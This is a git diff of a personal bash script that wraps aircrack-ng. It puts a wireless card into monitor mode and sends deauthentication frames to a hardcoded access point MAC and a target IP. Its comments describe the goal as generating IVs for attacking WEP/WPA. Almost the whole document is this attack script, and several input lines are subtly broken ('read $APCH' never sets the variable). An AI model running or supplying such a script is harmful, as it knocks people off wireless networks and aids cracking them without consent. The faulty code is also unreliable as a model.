@@ -1,21 +1,45 @@
-#! /bin/bash
+#!/usr/bin/bash
+# ----------------------------------------------------------
+# airsnipe-ip.sh
+# ----------------------------------------------------------
+## Originally wrote this to help me remember the switches
+## and positional args for aireplay-ng, which is why it's
+## interactively prompting the user for input. This cmd is
+## used primarily to engineer a situation that generates
+## IVs between stations & access points for later analy-
+## sis and/or attacking WEP/WPA. Added '-ip' suffix because,
+## I was planning to implement the mac version separately.
+## It's basically my own, crappy script-kiddy script;
+## like airgeddon or ettercap (gross).
+## The aircrack-ng suite is amazing, btw.
+# http://brianc2788.github.io/
+# ----------------------------------------------------------
 
-# a recreation of airnipe-ip from memory/it's freaking easy.
-# brianc2788@gmail.com
-# used to send deauth signals from the pi, remotely.
+## Terminal colors. Be sure to enable backslash-escapes with echo.
+RED="\033[01;31m"
+GREEN="\033[01;32m"
+YELLOW="\033[01;33m"
+RESET="\033[00m"
 
-echo '::Airsnipe-IP::'
-echo 'you will need root/sudo privs'
-#echo 'Enter AP MAC: '
+echo -e "${YELLOW}[!] ${GREEN}AIRSNIPE-IP${RESET} - Bash script. Interactive aireplay-ng wrapper."
+echo -e "${YELLOW}[!] ${GREEN}http://brianc2788.github.io/${RESET}"
+
+# Check for root priviledges.
+if [ ${EUID} -ne 0 ];then
+    echo -e "${YELLOW}[i] ${RED}Priviledged account required to access wireless & raw socket interfaces.\n    Abort...."
+    exit
+fi
+
+#echo -e "Enter AP MAC: "
 #read $APMAC
-echo 'Enter AP channel: '
+echo -en "Enter AP channel: "
 read $APCH
-echo 'Enter target IP: '
+echo -en "Enter target IP: "
 read $TARIP
-echo 'Enter # of deauths: '
+echo -en "Enter # of deauths: "
 read $DANUM
 
-echo '::starting script... please wait::'
+echo -e "${YELLOW}[i] "
 
 airmon-ng check kill
 airmon-ng start wlan0 $APCH
@@ -26,4 +50,4 @@ aireplay-ng --deauth $DANUM -a 48:5d:36:35:04:06 -k $TARIP wlan0mon
 airmon-ng stop wlan0mon
 service networking restart
 
-echo '::script exiting::'
+echo -e "::script exiting::"
